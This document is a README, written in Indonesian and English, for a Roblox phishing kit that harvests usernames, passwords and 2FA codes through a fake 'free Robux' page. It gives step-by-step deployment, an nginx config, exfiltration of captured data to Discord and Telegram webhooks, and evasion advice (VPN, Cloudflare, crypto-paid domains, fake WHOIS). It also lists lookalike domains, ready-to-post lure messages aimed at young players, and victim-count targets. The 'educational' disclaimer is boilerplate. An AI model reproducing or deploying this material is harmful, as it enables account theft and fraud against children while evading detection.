# Roblox Phishing Site dengan 2FA Bypass

## 🎯 FITUR

- ✅ Clone tampilan Roblox yang convincing
- ✅ Capture username, password, email
- ✅ Bypass 2FA dengan fake verification prompt
- ✅ Real-time logging ke file, Discord, dan Telegram
- ✅ Admin panel untuk monitoring victims
- ✅ Auto-redirect ke Roblox.com setelah phishing
- ✅ IP tracking dan user agent capture
- ✅ ProtonVPN integration untuk stealth

---

## 📦 INSTALASI

### Prerequisites
```bash
# Install Node.js (v16+)
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Install ProtonVPN (untuk bypass detection)
wget https://repo.protonvpn.com/debian/dists/stable/main/binary-all/protonvpn-stable-release_1.0.3-2_all.deb
sudo dpkg -i protonvpn-stable-release_1.0.3-2_all.deb
sudo apt update
sudo apt install protonvpn
```

### Setup Project
```bash
cd roblox-phishing
npm install
```

---

## 🚀 DEPLOYMENT

### Local Testing
```bash
npm start
# Akses: http://localhost:3000
# Admin: http://localhost:3000/admin
```

### ProtonVPN Integration (BYPASS DETECTION)
```bash
# Login ProtonVPN
protonvpn-cli login

# Connect to fastest server
protonvpn-cli connect --fastest

# Atau pilih server specific (recommended: Netherlands/Switzerland)
protonvpn-cli connect NL-FREE#1

# Verify IP changed
curl https://api.ipify.org

# Run server behind VPN
npm start
```

### Deploy ke VPS (Production)

**Option 1: Deploy dengan ProtonVPN**
```bash
# Setup VPS (Ubuntu 22.04 recommended)
ssh root@your-vps-ip

# Install dependencies
apt update && apt upgrade -y
apt install -y nodejs npm git

# Install ProtonVPN
wget https://repo.protonvpn.com/debian/dists/stable/main/binary-all/protonvpn-stable-release_1.0.3-2_all.deb
dpkg -i protonvpn-stable-release_1.0.3-2_all.deb
apt update
apt install -y protonvpn

# Login ProtonVPN
protonvpn-cli login
# Username: your-proton-email
# Password: your-proton-password

# Connect VPN
protonvpn-cli connect --fastest

# Clone project
git clone <your-repo-url>
cd roblox-phishing
npm install

# Setup environment
nano .env
# Add:
# DISCORD_WEBHOOK=https://discord.com/api/webhooks/YOUR_WEBHOOK
# TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN
# TELEGRAM_CHAT_ID=YOUR_CHAT_ID
# PORT=3000

# Run with PM2 (auto-restart)
npm install -g pm2
pm2 start server.js --name roblox-phish
pm2 startup
pm2 save

# Setup Nginx reverse proxy
apt install -y nginx
nano /etc/nginx/sites-available/phishing
```

**Nginx Config:**
```nginx
server {
    listen 80;
    server_name your-domain.com;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_cache_bypass $http_upgrade;
    }
}
```

```bash
# Enable site
ln -s /etc/nginx/sites-available/phishing /etc/nginx/sites-enabled/
nginx -t
systemctl restart nginx

# Setup SSL (optional but recommended)
apt install -y certbot python3-certbot-nginx
certbot --nginx -d your-domain.com
```

**Option 2: Deploy ke Heroku (Free)**
```bash
# Install Heroku CLI
curl https://cli-assets.heroku.com/install.sh | sh

# Login
heroku login

# Create app
heroku create roblox-free-robux-gen

# Deploy
git init
git add .
git commit -m "Initial commit"
git push heroku main

# Set environment variables
heroku config:set DISCORD_WEBHOOK=your_webhook
heroku config:set TELEGRAM_BOT_TOKEN=your_token
heroku config:set TELEGRAM_CHAT_ID=your_chat_id

# Open app
heroku open
```

**Option 3: Deploy ke Vercel (Instant)**
```bash
# Install Vercel CLI
npm i -g vercel

# Deploy
vercel --prod

# URL akan auto-generate: https://roblox-phishing-xxx.vercel.app
```

---

## 🔐 2FA BYPASS MECHANISM

### Cara Kerja:
1. **Victim input credentials** → Captured immediately
2. **Fake loading screen** → 8 detik processing simulation
3. **2FA prompt muncul** → Victim diminta input kode
4. **Victim input 2FA dari email/app** → Captured!
5. **Fake success message** → "Robux transfer completed"
6. **Auto-redirect** → Ke roblox.com dalam 3 detik

### Technical Flow:
```
User Input (username/password/email)
    ↓
POST /api/capture (data logged)
    ↓
Fake processing (8s animation)
    ↓
2FA modal appears
    ↓
User inputs real 2FA code
    ↓
POST /api/capture-2fa (code logged)
    ↓
Success message + redirect to Roblox
```

### ProtonVPN Role:
- **Hide attacker IP** dari Roblox anti-fraud
- **Bypass geo-restrictions** kalau target region-locked
- **Prevent tracking** dari victim's ISP/authorities
- **Rotate IP** untuk multiple campaigns

---

## 🎭 DOMAIN SETUP (Tampak Legit)

### Recommended Domain Names:
```
roblox-free-robux.com
robloxgenerator.net
robux-claim.net
robloxrewards.net
rblx-promo.com
free-robux-2024.com
robloxgift.net
```

### Domain Providers (Accept Crypto):
- **Namecheap** - Bitcoin accepted
- **Njalla** - Anonymous, crypto only
- **Epik** - Privacy-focused

### DNS Setup (Cloudflare - Hide Origin IP):
```bash
# Point domain to VPS
A     @     your-vps-ip (proxied ☁️)
A     www   your-vps-ip (proxied ☁️)

# Enable Cloudflare features:
- SSL/TLS: Full
- Always Use HTTPS: On
- Automatic HTTPS Rewrites: On
- Browser Integrity Check: Off (avoid false positives)
```

---

## 📊 MONITORING & LOGGING

### Local Logs
```bash
# View captured data
cat captured_data/master_log.txt

# View individual victim files
ls captured_data/
cat captured_data/victim_*.json
```

### Real-time Dashboard
```
http://your-domain.com/admin
```

### Discord Webhook Setup
```bash
# Create webhook in Discord server
# Server Settings → Integrations → Webhooks → New Webhook
# Copy webhook URL

# Set in .env
DISCORD_WEBHOOK=https://discord.com/api/webhooks/123456789/abcdefghijklmnop
```

### Telegram Bot Setup
```bash
# Create bot via @BotFather
/newbot
# Copy bot token

# Get your chat ID
# Message @userinfobot

# Set in .env
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=987654321
```

---

## 🛡️ OPSEC (OPERATIONAL SECURITY)

### DO:
✅ **Always use ProtonVPN** sebelum deploy/test
✅ **Use Cloudflare** untuk hide origin IP
✅ **Use crypto** untuk domain/VPS payment
✅ **Use Telegram/Discord** for real-time alerts
✅ **Rotate domains** setelah campaign (7-14 days)
✅ **Use fake WHOIS** data saat register domain
✅ **Use VPS dari privacy-focused provider** (Njalla, 1984 Hosting)

### DON'T:
❌ **NEVER test tanpa VPN**
❌ **NEVER use personal email** untuk setup
❌ **NEVER host di shared hosting** (easy trace)
❌ **NEVER keep logs di VPS** lama (download & delete)
❌ **NEVER access admin panel tanpa VPN**
❌ **NEVER use sama domain** untuk multiple campaigns

---

## 🎯 DISTRIBUTION METHODS

### 1. Social Media (Discord/TikTok/Twitter)
```
🎮 FREE ROBUX GENERATOR! 🎮
Get 10,000 FREE Robux instantly! 
✅ No survey ✅ No human verification
👉 https://your-domain.com
Limited time only! Claim now!
```

### 2. YouTube Comments
```
I just got 10k FREE Robux from this site!!!
Working 2024! No ban!
Link: your-domain.com
```

### 3. Roblox Game Chat
```
psst.. want free robux?
10k instant, no ban
[your-domain.com]
thank me later
```

### 4. Reddit Posts (r/RobloxHelp, r/FreeRobux)
```
Title: "Found a working Robux generator (legit, no ban)"
Body: Screenshot of fake balance + link
```

---

## 🔧 CUSTOMIZATION

### Change Robux Amount
Edit `index.html` line 183:
```javascript
const target = 10000; // Change amount here
```

### Change Loading Messages
Edit `index.html` line 157-165:
```javascript
const statusMessages = [
    "Your custom message 1...",
    "Your custom message 2...",
    // Add more
];
```

### Add More Fake Steps
```javascript
// In submitTwoFA() function, add delay:
setTimeout(() => {
    // Show processing message
}, 2000);
```

---

## 📈 SUCCESS METRICS

**Good Campaign:**
- 30-50% conversion rate (views → credentials)
- 60-80% of victims input 2FA
- Average 100-500 victims per day

**Domain Lifetime:**
- 7-14 days before takedown
- Have 3-5 backup domains ready

---

## 🚨 LEGAL DISCLAIMER

This tool is for **EDUCATIONAL PURPOSES ONLY**. 

Unauthorized access to accounts is **ILLEGAL** in most jurisdictions. Use at your own risk. Developer is not responsible for misuse.

---

## 📝 CHANGELOG

**v1.0.0** (2026-07-22)
- Initial release
- Full 2FA bypass implementation
- ProtonVPN integration guide
- Real-time monitoring dashboard
- Discord/Telegram webhooks
- Multi-deployment options

---

## 🤝 SUPPORT

For issues or feature requests, contact via secure channels only.

**OPSEC REMINDER:** Never discuss campaigns on clearnet platforms.
